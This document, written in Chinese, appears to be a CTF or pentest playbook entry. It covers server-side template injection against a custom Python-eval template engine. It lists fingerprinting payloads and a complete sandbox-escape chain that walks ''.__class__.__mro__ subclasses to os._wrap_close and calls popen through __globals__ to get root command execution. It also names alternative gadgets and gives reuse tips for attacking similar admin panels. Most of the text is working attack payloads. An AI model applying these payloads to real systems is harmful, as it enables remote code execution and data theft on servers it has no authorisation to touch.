# 自定义 Python 求值模板引擎 SSTI → RCE（沙箱只封裸名、未封 dunder 内省）

## 场景
老旧 OA/管理后台的「模板渲染内核」自称「HTML/Liquid Stack + Native JIT」，实际是一个自定义模板引擎：
- `{{ expr }}` 直接对 Python 表达式求值（支持属性访问、dunder、下标、方法调用、算术运算）；
- `{% if %} / {% for %}` 为控制流；
- 渲染错误会以 `模板渲染错误: <异常信息>` 回显，可直接用作错误回显 oracle。

该引擎的“沙箱”仅把 `__import__`、`globals`、`dir` 等裸名置为 undefined，但**没有**拦截 `''.__class__.__mro__` 这类对象内省，是典型的只封名字、不封对象的半吊子沙箱。

## 指纹判据（快速确认引擎类型）
- `{{ 7*7 }}` → `49`（数值求值）
- `{{ '7' * 7 }}` → `7777777`（**Python 字符串乘法**，区别于 Liquid/Jinja 的字符串拼接）
- `{{ 1/2 }}` → `0.5`（**Python3 真除法**）
- `{{ 'abc'.upper() }}` → `ABC`（方法调用直接可用）
- `{{ ''.__class__.__name__ }}` → `str`（dunder 内省未被过滤）
- 标准 Liquid/Jinja 过滤器（`upcase`/`downcase`/`size`）报 `No filter named '...'`

只要看到「Python 字符串乘法 + 真除法 + 方法调用」三个特征同时成立，基本可断定是 Python eval 类引擎，直接走沙箱逃逸。

## 关键技巧：无硬编码下标的子类定位
1. 先 dump `{{ ''.__class__.__mro__[1].__subclasses__() }}`（`str.__mro__` 只有 `(str, object)`，`[1]` 即 `object`），得到全部子类列表（HTML 会转义，`&lt;class &#39;...&#39;&gt;`，需 unescape 后按 `, <class` 切分）。
2. 在其中定位 `os._wrap_close`（`os.py` 内置类，其 `__init__.__globals__` 就是 os 模块全局字典，含 `popen`/`system` 等）。
3. 最终 payload：
   `{{ ''.__class__.__mro__[1].__subclasses__()[IDX].__init__.__globals__['popen'](CMD).read() }}`
   返回 `uid=0(root)` 即 RCE 成功，随后 `cat /challenge/flag.txt` 之类读文件。

注意：`os._wrap_close.__globals__` 里**没有**名为 `os` 的键（`os.py` 不把自身绑定到 `os` 名），用 `['os']` 会报 `'dict object' has no attribute 'os'`；直接用 `['popen']` 或 `['system']`。

## 复用要点
- 遇到“模板渲染内核 / 实时渲染 / Native JIT”类面板，先用上述三个特征 payload 指纹，命中即按 Python SSTI 沙箱逃逸链路打，不必先猜是 Jinja/Liquid。
- 优先选 `os._wrap_close`（存在稳定、`__globals__` 直达 os 模块），其次 `warnings.catch_warnings.__init__.__globals__['__builtins__']['__import__']`、`subprocess.Popen`。
- 下标随 Python 环境变化，脚本里应动态枚举子类定位下标，不要写死。
